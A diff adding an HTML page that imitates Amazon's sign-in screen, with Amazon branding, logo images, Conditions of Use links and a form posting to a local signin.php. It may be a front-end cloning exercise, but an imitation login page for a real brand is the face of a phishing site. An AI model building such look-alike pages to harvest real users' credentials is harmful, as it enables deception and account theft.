@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title> Amazon Sign In</title>
+<style>
+
+/*.button{
+	margin-left:135px;
+	width:350px;
+	height:100%;
+	text-align:center;
+	font-family:Arial,sans-serif;
+	line-height:29px;
+	border-radius:3px;
+	border-style:outset;
+	background-color:#f2f4f6;
+	border-width:1px;
+	display:inline-block;
+	vertical-align:middle;
+	border-color:#0000;
+}*/
+hr{
+border:0px;
+height:1px;
+background-image: linear-gradient(to right, rgba(0,0,0,0), silver, rgba(0,0,0,0));
+margin:auto;
+
+}
+.create{
+	margin-left:36%;
+	height:34px;
+	width:355px;
+
+}
+body{
+	font-family:Amazon Ember;
+}
+h1{
+	font-family: Amazon Ember;
+	font-weight: normal;
+	font-size: 29px;
+}
+	form{
+		border-style: solid;
+		padding-left: 25px;
+		border-width: 1px;
+		border-radius: 4px;
+		border-color: #D8D8D8;
+		align-items: center;
+		text-align:left;
+		width:335px;
+		margin:auto;
+}
+label{
+		padding-left: 2px;
+		padding-bottom: 2px;
+		font-family: "Amazon Ember";
+		font-weight: normal;
+		font-size: 13px;
+
+}
+
+input[type=email]{
+	padding-left: 7px;
+	width: 300px;
+	border: 1px solid #ccc;
+	border-radius: 3px;
+	margin:2px;
+	height: 25px;
+}
+h5{
+	line-height:1;
+	font-size: 12px;
+	color:#767676;
+	padding: 0 8px 0 7px;
+	margin:1.67em;
+	text-align: center;
+}
+	a:link {
+  		color: blue;
+  		background-color: transparent;
+  		text-decoration: none;
+	}
+	a:visited {
+  		color: purple;
+  		background-color: transparent;
+  		text-decoration: none;
+	}
+
+	a:hover {
+  		color: #E67E22;
+  		background-color: transparent;
+  		text-decoration: underline;
+	}
+
+	a:active {
+  		color: yellow;
+  		background-color: transparent;
+  		text-decoration: underline;
+	}
+</style>
+</head>
+<body>
+	<p align="center">
+		<img src="final_amazon.png" alt = "Amazon logo" height=50 width=150>
+	</p>
+	<form id="sign" method="POST" action="signin.php">
+	<h1> Login</h1>
+	<label for='email'>Email or mobile phone number </label><br>
+	<input type='email' id='email'><br>
+	<p id="msg1"></p>
+	<input href="pass.html" type=image src=continue.png alt='Continue' height=30px width=312px style="padding:2px 0 12px 0"> <br>
+	<p style="font-family:Amazon Ember;font-size:12px;padding:0 12px 0 0;word-wrap: break-word">By continuing, you agree to <a href="#" target="_parent">Amazon's Conditions of Use</a> and <a href="#" target="_parent">Privacy Notice.</a>
+	</p>
+	<p style="font-family:Amazon Ember;font-size:13px">
+		<a href="#"> Need help?</a>
+	</form>
+	<p align="center">
+	<img src="newtoamazon.png">
+	</p>
+	<!--<a href="#"><img class="create" src="create_account.png" ></a>-->
+	<input href="dsi.html" type=image src="create_account.png" class="create" alt='CreateAccount'>
+	<hr>
+	
+</body> 
+<script src="signin.js"></script>
+</html>
+
